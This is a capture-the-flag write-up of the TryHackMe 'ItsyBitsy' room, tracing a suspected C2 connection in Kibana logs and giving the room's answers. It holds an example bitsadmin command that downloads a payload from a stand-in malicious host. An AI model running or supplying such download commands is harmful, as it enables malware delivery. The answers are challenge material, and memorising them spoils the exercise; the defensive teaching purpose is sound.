ItsyBitsy (THM)

Scenario

During normal SOC monitoring, Analyst John observed an alert on an IDS solution indicating a potential C2 communication from a user Browne from the HR department. A suspicious file was accessed containing a malicious pattern THM:{ ________ }. A week-long HTTP connection logs have been pulled to investigate. Due to limited resources, only the connection logs could be pulled out and are ingested into the connection_logs index in Kibana.

Our task in this room will be to examine the network connection logs of this user, find the link and the content of the file, and answer the questions.

https://tryhackme.com/room/itsybitsy

1- How many events were returned for the month of March 2022?

1482

2- What is the IP associated with the suspected user in the logs?

192.166.65.54

we only got 2 ips of course i thought the malicious one would be the one with lots of events but after analysis it is not

so I check the other one which has only 2 events we see its communicating with an external ip 104.23.99.198 which was flagged in the past for several malicious activities, including DDoS attacks, DNS poisoning, and hacking-related activity. Reports span from December 2020 to October 2021, with multiple independent sources confirming the abuse. however that was from 3 years ago now the ip ownership changes e.g., reallocated by the hosting provider) or the malicious service using it is taken down.

also we see the user bits admin to download a file from its c2 (pastebin)

3- The user’s machine used a legit windows binary to download a file from the C2 server. What is the name of the binary?

bitsadmin

Bitsadmin : A Windows command-line tool used to create, manage, and monitor Background Intelligent Transfer Service (BITS) jobs. BITS is a legitimate Windows component that transfers files in the background using idle network bandwidth, often used by Windows Update and other Microsoft services. However its also a LOLBIN

  • Attackers abuse bitsadmin to download payloads from remote servers without triggering some basic security tools, since it’s a trusted Windows binary.
  • Can be used to stage malware, download C2 tools, or exfiltrate data.
  • Examples:
    • bitsadmin /transfer myjob /download /priority high http://malicious.com/payload.exe C:\temp\payload.exe – Downloading a malicious file.
    • Creating persistent jobs that trigger malware downloads after reboot.

4- The infected machine connected with a famous filesharing site in this period, which also acts as a C2 server used by the malware authors to communicate. What is the name of the filesharing site?

pastebin.com

Pastebin is a legitimate online service used to share plain text, such as code snippets or configuration files. Attackers can abuse it as a C2 by hosting commands or payloads on a Pastebin page, which malware periodically checks and executes, hiding malicious traffic within normal HTTPS requests to a legitimate site.
